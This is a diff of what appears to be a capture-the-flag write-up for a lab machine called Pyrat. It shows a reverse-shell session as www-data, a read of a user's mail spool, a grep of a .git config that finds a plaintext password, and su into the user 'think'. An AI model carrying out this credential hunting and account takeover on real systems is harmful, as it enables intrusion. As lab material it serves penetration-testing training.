@@ -51,5 +51,60 @@ connect to [10.9.30.202] from (UNKNOWN) [10.10.4.202] 57226
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
+
+/var/spool/mail/think
+
+www-data@Pyrat:/var/spool/mail$ cat think
+cat think
+From root@pyrat  Thu Jun 15 09:08:55 2023
+Return-Path: <root@pyrat>
+X-Original-To: think@pyrat
+Delivered-To: think@pyrat
+Received: by pyrat.localdomain (Postfix, from userid 0)
+        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+Subject: Hello
+To: <think@pyrat>
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
+Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+From: Dbile Admen <root@pyrat>
+
+Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
+www-data@Pyrat:/var/spool/mail$ 
+
+**Found Git project**
+
+www-data@Pyrat:/opt/dev/.git$ grep -r "password" .
+grep -r "password" .
+./config:       password = _TH1NKINGPirate$_
+www-data@Pyrat:/opt/dev/.git$ cat ./config
+cat ./config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[user]
+        name = Jose Mario
+        email = josemlwdf@github.com
+
+[credential]
+        helper = cache --timeout=3600
+
+[credential "https://github.com"]
+        username = think
+        password = _TH1NKINGPirate$_
+
+**user Think granted**
+www-data@Pyrat:/opt/dev/.git$ su think
+su think
+Password: _TH1NKINGPirate$_
+
+think@Pyrat:/opt/dev/.git$ id
+id
+uid=1000(think) gid=1000(think) groups=1000(think)
+think@Pyrat:/opt/dev/.git$ 
+
+
   
 <\code>
